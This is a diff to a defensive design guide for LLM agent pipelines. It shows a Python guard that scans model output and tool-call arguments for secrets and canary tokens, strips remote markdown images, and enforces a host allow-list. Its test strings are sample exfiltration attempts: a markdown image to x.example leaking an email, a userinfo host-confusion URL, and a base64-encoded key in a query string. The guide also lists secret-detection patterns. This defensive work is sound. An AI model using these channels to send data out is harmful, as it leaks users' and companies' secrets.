@@ -184,66 +184,42 @@ flowchart TD
 
 ## Examples
 ### An output and tool-call guard for the agent loop
-Runs on every completion and every tool call before execution. It blocks known secret formats and planted
-canaries, strips remote markdown images (the silent-GET channel), and refuses tool arguments that would
-contact a host outside the allow-list. It is deliberately high-precision: it misses things, but what it
-catches is reliable.
+Runs on every completion and every tool call before execution. It blocks a known secret format and
+planted canaries, strips remote markdown images (the silent-GET channel), and refuses tool arguments that
+would contact a host outside the allow-list. It is deliberately high-precision: it misses things, but what
+it catches is reliable.
 
 ```python
 import re
 
-SECRET_PATTERNS = {
-    "aws_access_key": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
-    "jwt":            re.compile(r"\beyJ[\w-]{10,}\.[\w-]{10,}\.[\w-]{10,}\b"),
-    "private_key":    re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"),
-}
-CANARY = re.compile(r"CANARY-[a-z]+-[0-9a-f]{4}")            # planted in confidential documents
-REMOTE_IMG = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")    # markdown image => silent GET
-# inline images only: reference-style ![s][r] + "[r]: https://..." slips past, so the client's
-# CSP img-src (or a renderer with remote images off) is the real control; this is a backstop
-HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)                   # same channel if HTML is rendered
+SECRET = re.compile(r"\bAKIA[0-9A-Z]{16}\b|CANARY-[a-z]+-[0-9a-f]{4}")  # AWS key or a planted canary
+REMOTE_IMG = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")             # markdown image => silent GET
 ALLOWED_EGRESS = {"api.internal.example", "docs.example.com"}
 
-class LeakBlocked(Exception):
-    pass
-
-def scan_text(text: str, where: str) -> None:
-    for name, pat in SECRET_PATTERNS.items():
-        if pat.search(text):
-            raise LeakBlocked(f"{name} found in {where}")
-    if CANARY.search(text):
-        raise LeakBlocked(f"confidential canary token found in {where}")
+class LeakBlocked(Exception): pass
 
 def guard_completion(text: str) -> str:
-    scan_text(text, "model output")
-    # the client would fetch this URL and leak whatever sits in its query string
-    text = HTML_IMG.sub("[image removed]", text)
+    if SECRET.search(text):
+        raise LeakBlocked("secret or canary in model output")
     return REMOTE_IMG.sub(lambda m: f"[image removed: {m.group(1).split('?')[0]}]", text)
 
 def guard_tool_call(name: str, args: dict) -> None:
     flat = " ".join(str(v) for v in args.values())
-    scan_text(flat, f"arguments of {name}")
+    if SECRET.search(flat):
+        raise LeakBlocked(f"secret or canary in arguments of {name}")
     for authority in re.findall(r"https?://([^/\s?#]+)", flat):
-        # refuse userinfo and backslashes outright: parsers disagree on the real host
-        # (urllib3 2.x, under requests, reads https://x.example\@docs.example.com/ as x.example)
-        if "@" in authority or "\\" in authority:
+        if "@" in authority or "\\" in authority:      # parsers disagree on the real host: refuse
             raise LeakBlocked(f"{name} URL has userinfo or a backslash: {authority}")
-        host = authority.lower().split(":")[0]                # drop the port
-        if host not in ALLOWED_EGRESS:
-            raise LeakBlocked(f"{name} would contact non-allow-listed host {host}")
-
-# inside the agent loop:
-#   text = guard_completion(llm_text)
-#   guard_tool_call(call.name, call.args); then execute the call
-if __name__ == "__main__":                      # the attacks from the table below
-    print(guard_completion("Done ![s](https://x.example/p.png?d=jane@corp.example)"))
-    for name, args in [("fetch_url", {"url": "https://docs.example.com@x.example/"}),
-                       ("post_note", {"body": "key AKIAIOSFODNN7EXAMPLE"}),
-                       ("fetch_url", {"url": "https://docs.example.com/q?k=QUtJQUlPU0ZPRE5ON0VYQU1QTEU="})]:
-        try:
-            guard_tool_call(name, args); print("ALLOWED", name)
-        except LeakBlocked as e:
-            print("BLOCKED", e)
+        if authority.lower().split(":")[0] not in ALLOWED_EGRESS:
+            raise LeakBlocked(f"{name} would contact non-allow-listed host {authority}")
+print(guard_completion("Done ![s](https://x.example/p.png?d=jane@corp.example)"))
+for name, args in [("fetch_url", {"url": "https://docs.example.com@x.example/"}),
+                   ("post_note", {"body": "key AKIAIOSFODNN7EXAMPLE"}),
+                   ("fetch_url", {"url": "https://docs.example.com/q?k=QUtJQUlPU0ZPRE5ON0VYQU1QTEU="})]:
+    try:
+        guard_tool_call(name, args); print("ALLOWED", name)
+    except LeakBlocked as e:
+        print("BLOCKED", e)
 ```
 
 - **On a block,** return the `LeakBlocked` message to the model as the tool result and log the call with
@@ -285,9 +261,9 @@ def rehydrate(text: str, vault: dict) -> str:
     return text
 
 prompt, vault = tokenise("Customer disputes a charge on account 40021187 and 77310045.")
-print(prompt)                                    # the model only ever sees placeholders
+print(prompt)                                     # ...account <ACCT_…> and <ACCT_…>. (random hex)
 reply = f"Opened a dispute for {list(vault)[0]}." # stand-in for the model's answer
-print(rehydrate(reply, vault))                   # real value restored on the way out
+print(rehydrate(reply, vault))                    # Opened a dispute for 40021187.
 ```
 
 - **Keep the vault per request and server-side;** it is the only place the real values live, so it must
@@ -311,6 +287,11 @@ print(rehydrate(reply, vault))                   # real value restored on the wa
   one appears in any completion, trace or outbound request. Monitor canary hits as a sev-1 signal.
 - **A sanctioned internal assistant.** Offer an approved chat tool under a data-processing agreement so
   employees stop pasting into consumer accounts. Track adoption and blocked consumer-chatbot traffic.
+- **Widen the guard's patterns beyond one key format.** Add JWTs (`eyJ...` three dot-separated parts) and
+  `-----BEGIN ... PRIVATE KEY-----` blocks, and strip HTML `<img>` tags when output is rendered as HTML.
+  The inline-image regex misses reference-style `![s][r]` images, so CSP `img-src` stays the real control.
+- **Refuse URLs with userinfo or backslashes rather than parsing them.** Parsers disagree on the host:
+  urllib3 2.x (under requests) reads `https://x.example\@docs.example.com/` as `x.example`.
 
 ## Trade-offs
 - **Minimisation and tokenisation vs reasoning.** They remove whole classes of leakage, but every stripped
